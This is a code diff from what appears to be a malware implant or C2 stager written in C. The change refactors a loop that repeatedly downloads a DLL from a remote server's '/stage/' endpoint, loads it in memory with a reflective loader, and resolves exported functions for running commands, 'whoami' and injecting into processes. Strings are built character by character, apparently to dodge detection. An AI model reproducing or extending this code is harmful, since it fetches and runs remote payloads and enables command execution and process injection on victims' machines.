@@ -278,9 +278,10 @@ void myMain()
     // shlwapi
     api->StrToIntW = GetSymbolAddress((HANDLE)shlwapidll, StrToIntW_c);
 
-    DLL esgStdDll;
-    PDLL pEsgStdDll = &esgStdDll;
-    pEsgStdDll->pBuffer = NULL;
+    // downloaded DLL with the reflective loader in it
+    DLL primalDll;
+    PDLL pPrimalDll = &primalDll;
+    pPrimalDll->pBuffer = NULL;
 
     WCHAR wServer[] = { SERVER_M } ;
     WCHAR tasksPath[] = { '/', 't', 'a', 's', 'k', 's', '/', 0 };
@@ -291,26 +292,34 @@ void myMain()
     CHAR msg[] = { 'd', 'l', 'l', 'N', 'o', 't', 'F', 'o', 'u', 'n', 'd', 0 };
     #endif
     WCHAR wcStageEndpoint[] = { '/', 's', 't', 'a', 'g', 'e', '/', 0 };
-    while (pEsgStdDll->pBuffer == NULL)
+    while (pPrimalDll->pBuffer == NULL)
     {
-        pEsgStdDll->pBuffer = httpGetExecutable(api, &pEsgStdDll->Size, wcStageEndpoint, wServer, port);
+        pPrimalDll->pBuffer = httpGetExecutable(api, &pPrimalDll->Size, wcStageEndpoint, wServer, port);
         ((SLEEP)api->Sleep)(5000);
-        if (pEsgStdDll->pBuffer != NULL)
+        if (pPrimalDll->pBuffer != NULL)
         { break; }
         #ifdef DEBUG
         ((MESSAGEBOXA)api->MessageBoxA)(0, msg, msg, 0X0L);
         #endif
     }
 
-    ESG_STD_API EsgStdApi = { 0 };
-    PESG_STD_API PEsgStdApi = &EsgStdApi;
+    DLL esgStdDll;
+    PDLL pEsgStdDll = &esgStdDll;
+    pEsgStdDll->pBuffer = NULL;
 
-    // TODO: am I losing a pointer in heap here?
-    pEsgStdDll->pBuffer = executeRD(api, pEsgStdDll);
+    // the DLL is in its prime form after running the reflective loader
+    pEsgStdDll->pBuffer = executeRD(api, pPrimalDll);
+
+    // free the previous DLL
+    ((FREE)api->free)(pPrimalDll->pBuffer);
+    pPrimalDll->pBuffer = NULL;
 
     CHAR runCmd_c[] = { 'R', 'u', 'n', 'C', 'm', 'd', 0 };
     CHAR whoami_c[] = { 'W', 'h', 'o', 'a', 'm', 'i', 0 };
     CHAR injectIntoProcess_c[] = { 'i', 'n', 'j', 'e', 'c', 't', 'I', 'n', 't', 'o', 'P', 'r', 'o', 'c', 'e', 's', 's', 0 };
+
+    ESG_STD_API EsgStdApi = { 0 };
+    PESG_STD_API PEsgStdApi = &EsgStdApi;
 
     PEsgStdApi->RunCmd = GetSymbolAddress((HANDLE)pEsgStdDll->pBuffer, runCmd_c);
     PEsgStdApi->Whoami = GetSymbolAddress((HANDLE)pEsgStdDll->pBuffer, whoami_c);
